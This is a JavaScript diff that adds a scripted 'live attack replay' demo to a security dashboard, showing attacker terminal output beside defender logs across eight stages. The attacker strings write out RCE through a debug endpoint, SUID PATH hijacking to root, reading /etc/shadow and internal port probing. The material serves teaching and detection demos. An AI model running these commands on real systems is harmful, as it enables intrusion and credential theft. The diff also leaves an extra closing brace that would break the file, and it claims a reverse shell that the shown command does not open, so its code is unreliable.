@@ -34,6 +34,7 @@ class WatchController {
     this.initDrawer();
     this.initHuntPanel();
     this.renderTechniques();
+    this.initLiveAttackDemo();
 
     this.bindWebSocket();
     await this.loadInitialData();
@@ -511,6 +512,482 @@ class WatchController {
       ctx.fillRect(x, y, barWidth, barHeight);
     });
   }
+
+  initLiveAttackDemo() {
+    const btnLaunch = document.getElementById('btnLaunchLiveAttack');
+    const modal = document.getElementById('liveAttackModal');
+    const btnClose = document.getElementById('btnCloseLiveAttack');
+
+    this.liveDemo = new LiveAttackSimulator();
+
+    if (btnLaunch) {
+      btnLaunch.addEventListener('click', () => {
+        sound.bootHum();
+        if (modal) modal.style.display = 'flex';
+        this.liveDemo.start();
+      });
+    }
+
+    if (btnClose && modal) {
+      btnClose.addEventListener('click', () => {
+        sound.keyClick();
+        this.liveDemo.pause();
+        modal.style.display = 'none';
+      });
+    }
+
+    // Auto-launch if URL has ?demo=1
+    const params = new URLSearchParams(window.location.search);
+    if (params.get('demo') === '1') {
+      setTimeout(() => {
+        if (modal) modal.style.display = 'flex';
+        this.liveDemo.start();
+      }, 500);
+    }
+  }
+}
+
+// ---------------------------------------------------------------------------
+// 60-SECOND FULL-SPECTRUM LIVE CYBER ATTACK REPLAY SIMULATOR
+// ---------------------------------------------------------------------------
+
+class LiveAttackSimulator {
+  constructor() {
+    this.totalDuration = 60.0;
+    this.currentTime = 0.0;
+    this.speed = 1;
+    this.isPlaying = false;
+    this.timerId = null;
+    this.currentStageIdx = 0;
+
+    this.stages = [
+      {
+        id: 'stage-1',
+        title: 'RECONNAISSANCE',
+        techId: 'T1595.001',
+        desc: 'Active network port scan & service fingerprinting against perimeter interface 10.10.14.90.',
+        statusText: 'INBOUND PROBES DETECTED',
+        startTime: 0.0,
+        endTime: 7.5,
+        redOutput: `root@kali:~# nmap -sS -T4 -p 22,80,443,3389,8080 10.10.14.90
+Starting Nmap 7.94 ( https://nmap.org ) at 2026-11-16 00:00:01 UTC
+Nmap scan report for 10.10.14.90
+Host is up (0.00042s latency).
+PORT     STATE SERVICE VERSION
+22/tcp   OPEN  ssh     OpenSSH 8.9p1 Ubuntu
+80/tcp   OPEN  http    Apache httpd 2.4.52
+443/tcp  OPEN  https   Apache httpd 2.4.52
+3389/tcp CLOSE ms-wbt-server
+8080/tcp OPEN  http-proxy NO_ENTRY API Gateway v1.4
+Nmap done: 1 IP address (1 host up) scanned in 1.42 seconds
+root@kali:~# `,
+        blueOutput: `[10:00:02] [FIREWALL-INBOUND] SRC=198.51.100.42 DST=10.10.14.90 PROTO=TCP DPT=22,80,443,3389,8080 FLAGS=SYN
+[10:00:03] [SURICATA-ALERT] ET SCAN Potential Inbound Port Scan - 5 SYNs in 1.2s from 198.51.100.42
+[10:00:04] [ZEEK-CONN] duration=0.0012 orig_h=198.51.100.42 resp_h=10.10.14.90 history=ShAdDr
+[10:00:05] [SOC-EVENT] Sensor 01 flagged external recon sweep. Severity: LOW.`
+      },
+      {
+        id: 'stage-2',
+        title: 'INITIAL FOOTHOLD',
+        techId: 'T1190',
+        desc: 'Exploiting public API debug endpoint to spawn interactive reverse shell session.',
+        statusText: 'EXPLOIT TRIGGERED // RCE ESTABLISHED',
+        startTime: 7.5,
+        endTime: 15.0,
+        redOutput: `root@kali:~# curl -X POST http://10.10.14.90:8080/api/v1/debug \\
+  -d "cmd=python3 -c \\"import pty; pty.spawn('/bin/bash')\\""
+[+] Exploit vector confirmed on /api/v1/debug [RCE CWE-94]
+[+] Catching reverse TCP stream on 198.51.100.42:4444...
+www-data@corp-web01:/var/www/html$ whoami
+www-data
+www-data@corp-web01:/var/www/html$ pwd
+/var/www/html`,
+        blueOutput: `[10:00:09] [NGINX-ACCESS] 198.51.100.42 POST /api/v1/debug HTTP/1.1 STATUS=200 BYTES=412
+[10:00:10] [SYSMON-EVENT-1] Image=/usr/bin/python3 CommandLine="python3 -c import pty..." ParentImage=/usr/sbin/apache2 User=www-data
+[10:00:11] [EDR-ANOMALY] Web daemon spawned interactive shell /bin/bash (Anomalous Child Process)
+[10:00:12] [CORRELATION-ALERT] Severity: HIGH | Rule: Web_Shell_Spawn_Suspicious_Interpreter
+[10:00:13] [SOC-DISPATCH] Incident INC-2026-LIVE created and queued.`
+      },
+      {
+        id: 'stage-3',
+        title: 'DEFENSE EVASION & LOCAL DISCOVERY',
+        techId: 'T1082 / T1059',
+        desc: 'Attacker enumerates system permissions, OS release, and scans for misconfigured SUID binaries.',
+        statusText: 'LOCAL HOST ENUMERATION ACTIVE',
+        startTime: 15.0,
+        endTime: 22.5,
+        redOutput: `www-data@corp-web01:/var/www/html$ uname -a && id
+Linux corp-web01 6.1.0-custom #1 SMP PREEMPT x86_64 GNU/Linux
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+www-data@corp-web01:/var/www/html$ find / -perm -4000 -type f 2>/dev/null
+/usr/bin/su
+/usr/bin/passwd
+/usr/local/bin/backup_util  <-- [!] SUID Root Bit Set!
+www-data@corp-web01:/var/www/html$ strings /usr/local/bin/backup_util | grep -E "system|exec"
+system("tar -czf /backups/site.tar.gz /var/www/html");`,
+        blueOutput: `[10:00:17] [AUDITD-EXEC] comm=find uid=33 auid=4294967295 exe=/usr/bin/find args="find / -perm -4000..."
+[10:00:19] [EDR-BEHAVIOR] High-volume file attribute enumeration detected from user=www-data
+[10:00:20] [ZEEK-STREAM] Continuous interactive payload streaming on TCP port 4444
+[10:00:21] [SURICATA-FLOW] Outbound interactive C2 traffic persistent on TCP:4444 to 198.51.100.42`
+      },
+      {
+        id: 'stage-4',
+        title: 'PRIVILEGE ESCALATION',
+        techId: 'T1548.001 / T1003',
+        desc: 'SUID PATH hijacking leveraged to acquire root execution; /etc/shadow dumped.',
+        statusText: 'ROOT PRIVILEGE ESCALATION CONFIRMED',
+        startTime: 22.5,
+        endTime: 30.0,
+        redOutput: `www-data@corp-web01:/var/www/html$ echo -e '#!/bin/bash\\n/bin/bash -p' > /tmp/tar
+www-data@corp-web01:/var/www/html$ chmod +x /tmp/tar
+www-data@corp-web01:/var/www/html$ export PATH=/tmp:$PATH
+www-data@corp-web01:/var/www/html$ /usr/local/bin/backup_util
+root@corp-web01:/var/www/html# id
+uid=0(root) gid=0(root) groups=0(root)
+root@corp-web01:/var/www/html# cat /etc/shadow | grep -E "root|admin"
+root:$6$v192x...:19240:0:99999:7:::
+svc_admin:$6$rounds=5000$q88xZ...:19240:0:99999:7:::
+[+] High-value credential hashes harvested!`,
+        blueOutput: `[10:00:24] [SYSMON-EVENT-1] Image=/tmp/tar CommandLine="/bin/bash -p" ParentImage=/usr/local/bin/backup_util IntegrityLevel=SYSTEM User=root
+[10:00:26] [EDR-ALERT] CRITICAL: PATH hijacking detected on SUID binary /usr/local/bin/backup_util
+[10:00:27] [AUDITD-SENSITIVE] Process /bin/cat (PID=4912) accessed /etc/shadow with EUID=0
+[10:00:29] [SIEM-SEVERITY-ESCALATION] Host corp-web01 elevated to SEV-1 CRITICAL.`
+      },
+      {
+        id: 'stage-5',
+        title: 'TELEMETRY INGESTION',
+        techId: 'T1046 / T1071',
+        desc: 'Attacker probes internal subnet; SOC correlation engine aggregates 12 correlated telemetry items.',
+        statusText: 'MULTI-SENSOR TELEMETRY CORRELATING',
+        startTime: 30.0,
+        endTime: 37.5,
+        redOutput: `root@corp-web01:/var/www/html# ping -c 1 10.10.14.200
+64 bytes from 10.10.14.200: icmp_seq=1 ttl=64 time=0.312 ms
+root@corp-web01:/var/www/html# nc -zv 10.10.14.200 445 88 389
+Connection to 10.10.14.200 445 port [tcp/microsoft-ds] succeeded!
+Connection to 10.10.14.200 88 port [tcp/kerberos] succeeded!
+[!] Preparing Kerberoast SPN ticket extraction...`,
+        blueOutput: `[10:00:32] [SIGMA-ENGINE] Ingesting telemetry pipeline: 12 events in 1.4s window
+[10:00:33] [CORRELATION-TREE] Linking Incident INC-2026-LIVE:
+    - Stage 1: SYN scan from 198.51.100.42
+    - Stage 2: Web RCE on :8080
+    - Stage 3: SUID PATH hijack to Root
+    - Stage 4: Internal SMB / Kerberos probing to 10.10.14.200
+[10:00:35] [TELEMETRY-STREAM] Ingest rate spiked: 42.4 EPS`
+      },
+      {
+        id: 'stage-6',
+        title: 'AUTOMATED SIEM DETECTION',
+        techId: 'T1548 / T1021',
+        desc: 'Sigma detection rules evaluate process creation & lateral probing, firing high-priority alerts.',
+        statusText: 'SIGMA DETECTION RULES TRIGGERED',
+        startTime: 37.5,
+        endTime: 45.0,
+        redOutput: `root@corp-web01:/var/www/html# python3 -c "import socket; s=socket.socket(); s.connect(('10.10.14.200', 445))"
+[*] Lateral propagation initiated to internal domain controller...
+[*] Sending crafted Kerberos ticket request...`,
+        blueOutput: `[10:00:39] [🔥 SIGMA MATCH] Rule: "proc_creation_lnx_suid_privesc_elevation"
+    Tags: attack.privilege_escalation, attack.t1548.001
+    Threat Score: 98/100 | Severity: CRITICAL
+[10:00:41] [🔥 SIGMA MATCH] Rule: "net_lateral_movement_dmz_to_internal_dc"
+    Target: 10.10.14.200:445 from Unauthorised DMZ host 10.10.14.90
+[10:00:43] [SIEM-DISPATCH] Escalated to Tier-2 SOC Dispatch Queue`
+      },
+      {
+        id: 'stage-7',
+        title: 'SOC ANALYST TRIAGE',
+        techId: 'SOC Workflow / IR',
+        desc: 'SOC analyst op-0x7f3a verifies process ancestry, confirms active breach, and triggers containment playbook.',
+        statusText: 'HUMAN INVESTIGATION & VERIFICATION',
+        startTime: 45.0,
+        endTime: 52.5,
+        redOutput: `root@corp-web01:/var/www/html# ps aux | grep -E "nc|bash|python"
+www-data  4812  0.1  0.2  bash -i
+root      4991  0.0  0.1  /bin/bash -p
+root@corp-web01:/var/www/html# cat /var/log/audit/audit.log
+[!] Audit daemon actively tracking shell session!`,
+        blueOutput: `[10:00:46] [SOC-INVESTIGATOR] Analyst op-0x7f3a assigned to INC-2026-LIVE
+[10:00:47] [SOC-QUERY] Query: host.ip: 10.10.14.90 AND process.euid: 0
+[10:00:49] [SOC-TRIAGE] Verdict: TRUE POSITIVE - ACTIVE ADVERSARY COMPROMISE
+[10:00:50] [REFLEX-DISPATCH] Initiating automated containment playbook PB-ZERO-TRUST-01
+[10:00:51] [PLAYBOOK] Action 1: Firewall ACL Update | Action 2: SDN Port Quarantine`
+      },
+      {
+        id: 'stage-8',
+        title: 'CONTAINMENT & RECOVERY',
+        techId: 'Containment / Eradication',
+        desc: 'Zero-trust network isolation blocks attacker IP, quarantines compromised host, and generates PIR.',
+        statusText: 'BREACH CONTAINED // INCIDENT RESOLVED',
+        startTime: 52.5,
+        endTime: 60.0,
+        redOutput: `root@corp-web01:/var/www/html# whoami
+Connection reset by peer.
+root@kali:~# curl -I http://10.10.14.90:8080/
+curl: (7) Failed to connect to 10.10.14.90 port 8080: Connection refused / Host Isolated
+[-] [OPERATION HALTED] Target host network interface isolated by Defender.`,
+        blueOutput: `[10:00:54] [REFLEX-ACTION] Added DROP rule for SRC=198.51.100.42 on Perimeter Firewall (iptables)
+[10:00:56] [CONTAINMENT] Host 10.10.14.90 isolated via SDN Controller (VLAN 999 Quarantine)
+[10:00:57] [REMEDIATION] Revoked credential svc_admin; removed SUID bit from /usr/local/bin/backup_util
+[10:00:59] [INCIDENT-RESOLVED] INC-2026-LIVE Closed in 58.4s. 0 Data Exfiltrated.
+========================================================================
+  POST-INCIDENT REPORT GENERATED // MTTD: 3.2s // MTTR: 8.4s
+========================================================================`
+      }
+    ];
+
+    this.bindControls();
+  }
+
+  bindControls() {
+    const btnPlayPause = document.getElementById('btnDemoPlayPause');
+    const btnSpeed = document.getElementById('btnDemoSpeed');
+    const btnReplay = document.getElementById('btnDemoReplay');
+    const track = document.getElementById('demoProgressTrack');
+    const chips = document.querySelectorAll('.stage-chip');
+
+    if (btnPlayPause) {
+      btnPlayPause.addEventListener('click', () => {
+        sound.keyClick();
+        this.togglePlayPause();
+      });
+    }
+
+    if (btnSpeed) {
+      btnSpeed.addEventListener('click', () => {
+        sound.keyClick();
+        this.toggleSpeed();
+      });
+    }
+
+    if (btnReplay) {
+      btnReplay.addEventListener('click', () => {
+        sound.bootHum();
+        this.replay();
+      });
+    }
+
+    if (track) {
+      track.addEventListener('click', (e) => {
+        const rect = track.getBoundingClientRect();
+        const clickRatio = Math.max(0, Math.min(1, (e.clientX - rect.left) / rect.width));
+        this.currentTime = clickRatio * this.totalDuration;
+        this.updateStageFromTime();
+        this.renderCurrentState();
+      });
+    }
+
+    chips.forEach(chip => {
+      chip.addEventListener('click', () => {
+        sound.keyClick();
+        const stageIdx = parseInt(chip.dataset.stage, 10);
+        if (!isNaN(stageIdx) && stageIdx >= 0 && stageIdx < this.stages.length) {
+          this.jumpToStage(stageIdx);
+        }
+      });
+    });
+  }
+
+  start() {
+    this.isPlaying = true;
+    const btnPlayPause = document.getElementById('btnDemoPlayPause');
+    if (btnPlayPause) btnPlayPause.textContent = '❚❚ PAUSE';
+
+    if (this.timerId) clearInterval(this.timerId);
+    this.timerId = setInterval(() => this.tick(), 250);
+    this.renderCurrentState();
+  }
+
+  pause() {
+    this.isPlaying = false;
+    const btnPlayPause = document.getElementById('btnDemoPlayPause');
+    if (btnPlayPause) btnPlayPause.textContent = '▶ PLAY';
+
+    if (this.timerId) {
+      clearInterval(this.timerId);
+      this.timerId = null;
+    }
+  }
+
+  togglePlayPause() {
+    if (this.isPlaying) {
+      this.pause();
+    } else {
+      if (this.currentTime >= this.totalDuration) {
+        this.currentTime = 0;
+      }
+      this.start();
+    }
+  }
+
+  toggleSpeed() {
+    if (this.speed === 1) this.speed = 2;
+    else if (this.speed === 2) this.speed = 4;
+    else this.speed = 1;
+
+    const btnSpeed = document.getElementById('btnDemoSpeed');
+    if (btnSpeed) btnSpeed.textContent = `${this.speed}x SPEED`;
+  }
+
+  replay() {
+    this.currentTime = 0.0;
+    this.currentStageIdx = 0;
+    this.start();
+  }
+
+  jumpToStage(stageIdx) {
+    this.currentStageIdx = stageIdx;
+    this.currentTime = this.stages[stageIdx].startTime;
+    this.renderCurrentState();
+  }
+
+  tick() {
+    if (!this.isPlaying) return;
+
+    this.currentTime += 0.25 * this.speed;
+    if (this.currentTime >= this.totalDuration) {
+      this.currentTime = this.totalDuration;
+      this.pause();
+      sound.victoryChime();
+    }
+
+    this.updateStageFromTime();
+    this.renderCurrentState();
+  }
+
+  updateStageFromTime() {
+    for (let i = 0; i < this.stages.length; i++) {
+      if (this.currentTime >= this.stages[i].startTime && this.currentTime < this.stages[i].endTime) {
+        if (this.currentStageIdx !== i) {
+          this.currentStageIdx = i;
+          sound.alertBlip();
+        }
+        return;
+      }
+    }
+    if (this.currentTime >= this.totalDuration) {
+      this.currentStageIdx = this.stages.length - 1;
+    }
+  }
+
+  renderCurrentState() {
+    const stage = this.stages[this.currentStageIdx];
+    if (!stage) return;
+
+    // 1. Timer Text & Progress Fill
+    const timerText = document.getElementById('demoTimerText');
+    const fill = document.getElementById('demoProgressFill');
+
+    const curMins = Math.floor(this.currentTime / 60);
+    const curSecs = Math.floor(this.currentTime % 60);
+    const totMins = Math.floor(this.totalDuration / 60);
+    const totSecs = Math.floor(this.totalDuration % 60);
+
+    if (timerText) {
+      timerText.textContent = `${String(curMins).padStart(2, '0')}:${String(curSecs).padStart(2, '0')} / ${String(totMins).padStart(2, '0')}:${String(totSecs).padStart(2, '0')}`;
+    }
+
+    if (fill) {
+      const pct = (this.currentTime / this.totalDuration) * 100;
+      fill.style.width = `${pct}%`;
+    }
+
+    // 2. Chips Highlighting
+    const chips = document.querySelectorAll('.stage-chip');
+    chips.forEach((c, idx) => {
+      c.classList.remove('active', 'completed');
+      if (idx === this.currentStageIdx) {
+        c.classList.add('active');
+      } else if (idx < this.currentStageIdx) {
+        c.classList.add('completed');
+      }
+    });
+
+    // 3. Stage Info Banner
+    const techBadge = document.getElementById('demoTechBadge');
+    const stageDesc = document.getElementById('demoStageDesc');
+    const topoStatus = document.getElementById('topoStatusText');
+
+    if (techBadge) techBadge.textContent = stage.techId;
+    if (stageDesc) stageDesc.textContent = stage.desc;
+    if (topoStatus) topoStatus.textContent = stage.statusText;
+
+    // 4. Dual Terminals Output
+    const redTerm = document.getElementById('demoRedTerm');
+    const blueTerm = document.getElementById('demoBlueTerm');
+
+    if (redTerm) {
+      redTerm.textContent = stage.redOutput;
+      redTerm.scrollTop = redTerm.scrollHeight;
+    }
+    if (blueTerm) {
+      blueTerm.textContent = stage.blueOutput;
+      blueTerm.scrollTop = blueTerm.scrollHeight;
+    }
+
+    // 5. Topology Animation Update
+    this.updateTopology(this.currentStageIdx);
+  }
+
+  updateTopology(stageIdx) {
+    const dot = document.getElementById('topoPacketDot');
+    const fwPoly = document.getElementById('fwPoly');
+    const webRect = document.getElementById('webRect');
+    const line1 = document.getElementById('topoLine1');
+    const line2 = document.getElementById('topoLine2');
+    const line3 = document.getElementById('topoLine3');
+    const line4 = document.getElementById('topoLine4');
+
+    if (!dot) return;
+
+    dot.style.display = 'block';
+
+    if (stageIdx === 0) {
+      // Recon: Attacker -> FW
+      dot.setAttribute('cx', '220');
+      dot.setAttribute('cy', '35');
+      dot.setAttribute('fill', '#FF1F3D');
+      dot.setAttribute('opacity', '1');
+      if (line1) line1.setAttribute('stroke', '#FF1F3D');
+      if (line2) line2.setAttribute('stroke', '#1E293B');
+    } else if (stageIdx === 1) {
+      // Foothold: FW -> Web
+      dot.setAttribute('cx', '420');
+      dot.setAttribute('cy', '35');
+      dot.setAttribute('fill', '#FF1F3D');
+      dot.setAttribute('opacity', '1');
+      if (line1) line1.setAttribute('stroke', '#FF1F3D');
+      if (line2) line2.setAttribute('stroke', '#FF1F3D');
+      if (webRect) webRect.setAttribute('stroke', '#FF1F3D');
+    } else if (stageIdx === 2 || stageIdx === 3) {
+      // Discovery & Privesc: Web
+      dot.setAttribute('cx', '520');
+      dot.setAttribute('cy', '35');
+      dot.setAttribute('fill', '#FFE600');
+      dot.setAttribute('opacity', '1');
+      if (webRect) webRect.setAttribute('stroke', '#FFE600');
+    } else if (stageIdx === 4 || stageIdx === 5) {
+      // Telemetry & SIEM match: Web -> SIEM
+      dot.setAttribute('cx', '700');
+      dot.setAttribute('cy', '35');
+      dot.setAttribute('fill', '#00E5FF');
+      dot.setAttribute('opacity', '1');
+      if (line4) line4.setAttribute('stroke', '#00E5FF');
+    } else if (stageIdx === 6) {
+      // Analyst triage: SIEM -> Web
+      dot.setAttribute('cx', '650');
+      dot.setAttribute('cy', '35');
+      dot.setAttribute('fill', '#00FF6A');
+      dot.setAttribute('opacity', '1');
+    } else if (stageIdx === 7) {
+      // Containment: FW blocks Attacker, drops line1
+      dot.setAttribute('opacity', '0');
+      if (line1) line1.setAttribute('stroke', '#FF1F3D');
+      if (fwPoly) fwPoly.setAttribute('stroke', '#00FF6A');
+      if (line2) line2.setAttribute('stroke', '#1E293B');
+      if (webRect) webRect.setAttribute('stroke', '#00FF6A');
+    }
+  }
+}
 }
 
 function startWatchController() {
